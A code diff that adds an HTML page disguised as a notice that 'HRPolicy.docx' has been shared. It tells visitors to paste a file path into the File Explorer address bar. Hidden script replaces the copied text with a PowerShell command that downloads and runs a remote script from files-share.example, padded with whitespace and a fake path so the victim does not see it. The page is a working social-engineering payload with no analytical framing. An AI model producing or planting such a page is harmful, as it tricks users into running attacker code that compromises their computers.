@@ -1,0 +1,22 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Shared file - HRPolicy.docx</title></head>
+<body>
+  <h2>HRPolicy.docx was shared with you</h2>
+  <p>To access the file, follow these steps:</p>
+  <ol>
+    <li>Copy the file path below</li>
+    <li>Open File Explorer and select the address bar (CTRL + L)</li>
+    <li>Paste the file path (CTRL + V) and press Enter</li>
+  </ol>
+  <input readonly value="C:\company\internal-secure\filedrive\HRPolicy.docx">
+  <button id="open">Open File Explorer</button>
+  <script>
+    document.addEventListener('copy', function (e) {
+      e.preventDefault();
+      e.clipboardData.setData('text/plain', 'powershell -c "iwr https://files-share.example/p.ps1 | iex"                                   # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx');
+    });
+    document.getElementById('open').onclick = function () { try { document.execCommand('copy'); } catch (e) {} };
+  </script>
+</body>
+</html>
